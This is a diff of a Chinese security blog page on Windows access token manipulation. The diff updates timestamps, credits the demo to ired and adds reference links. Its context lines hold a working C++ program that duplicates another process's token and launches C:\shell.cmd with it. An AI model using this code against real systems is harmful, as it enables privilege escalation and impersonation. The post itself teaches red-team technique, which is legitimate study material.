@@ -183,7 +183,7 @@
 <meta property="og:image" content="https://lengjibo.github.io/images/token/8.png">
 <meta property="og:image" content="https://lengjibo.github.io/images/token/9.png">
 <meta property="og:image" content="https://lengjibo.github.io/images/token/10.png">
-<meta property="og:updated_time" content="2020-03-27T11:38:58.818Z">
+<meta property="og:updated_time" content="2020-03-27T11:49:23.022Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Windows Access Token Manipulation　Attack">
 <meta name="twitter:description" content="“只有在梦想中，人才能真正自由。” －－《死亡诗社》  文如题目，Windows Access Token Manipulation　Attack">
@@ -426,7 +426,7 @@
                 
               
 
-              <time title="Post created: 2020-03-27 18:04:24 / Updated at: 19:38:58" itemprop="dateCreated datePublished" datetime="2020-03-27T18:04:24+08:00">2020-03-27</time>
+              <time title="Post created: 2020-03-27 18:04:24 / Updated at: 19:49:23" itemprop="dateCreated datePublished" datetime="2020-03-27T18:04:24+08:00">2020-03-27</time>
             
 
             
@@ -545,7 +545,7 @@
 <p><img src="../images/token/3.png" alt="image"></p>
 <p>过程是：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openprocess() --&gt; openprocesstoken() --&gt; impersonateloggedonuser()--&gt; duplicatetokenex() --&gt; createprocesswithtokenw()</span><br></pre></td></tr></table></figure>
-<p>demo：</p>
+<p>demo（ired的）：</p>
 <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> a;</span><br><span class="line">HANDLE processHandle;</span><br><span class="line">HANDLE tokenHandle = <span class="literal">NULL</span>;</span><br><span class="line">HANDLE duplicateTokenHandle = <span class="literal">NULL</span>;</span><br><span class="line">STARTUPINFO startupInfo;</span><br><span class="line">PROCESS_INFORMATION processInformation;</span><br><span class="line">DWORD PID_TO_IMPERSONATE = <span class="number">3060</span>;</span><br><span class="line"><span class="keyword">wchar_t</span> cmdline[] = <span class="string">L"C:\\shell.cmd"</span>;</span><br><span class="line">ZeroMemory(&amp;startupInfo, <span class="keyword">sizeof</span>(STARTUPINFO));</span><br><span class="line">ZeroMemory(&amp;processInformation, <span class="keyword">sizeof</span>(PROCESS_INFORMATION));</span><br><span class="line">startupInfo.cb = <span class="keyword">sizeof</span>(STARTUPINFO);</span><br><span class="line">processHandle = OpenProcess(PROCESS_ALL_ACCESS, <span class="literal">true</span>, PID_TO_IMPERSONATE);</span><br><span class="line">OpenProcessToken(processHandle, TOKEN_ALL_ACCESS, &amp;tokenHandle);</span><br><span class="line">DuplicateTokenEx(tokenHandle, TOKEN_ALL_ACCESS, <span class="literal">NULL</span>, SecurityImpersonation, TokenPrimary, &amp;duplicateTokenHandle);</span><br><span class="line">CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, <span class="literal">NULL</span>, cmdline, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;startupInfo, &amp;processInformation);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; a;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>运行该程序，我们就可以获得一个3060进程令牌权限运行的shell.cmd的进程。当然，你需要有这个进程的访问权限。</p>
 <p>但是也并不是所有的进程都都是可以被操作的，比如看下面的这个图：</p>
@@ -575,6 +575,9 @@
 <p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw</a></p>
 <p><a href="https://docs.microsoft.com/zh-cn/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex?redirectedfrom=MSDN" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex?redirectedfrom=MSDN</a></p>
 <p><a href="https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights</a></p>
+<p><a href="https://www.secpulse.com/archives/94848.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/94848.html</a></p>
+<p><a href="https://www.slideshare.net/JustinBui5/understanding-windows-access-token-manipulation" target="_blank" rel="noopener">https://www.slideshare.net/JustinBui5/understanding-windows-access-token-manipulation</a></p>
+<p><a href="https://www.lshack.cn/721/" target="_blank" rel="noopener">https://www.lshack.cn/721/</a></p>
 
       
     </div>
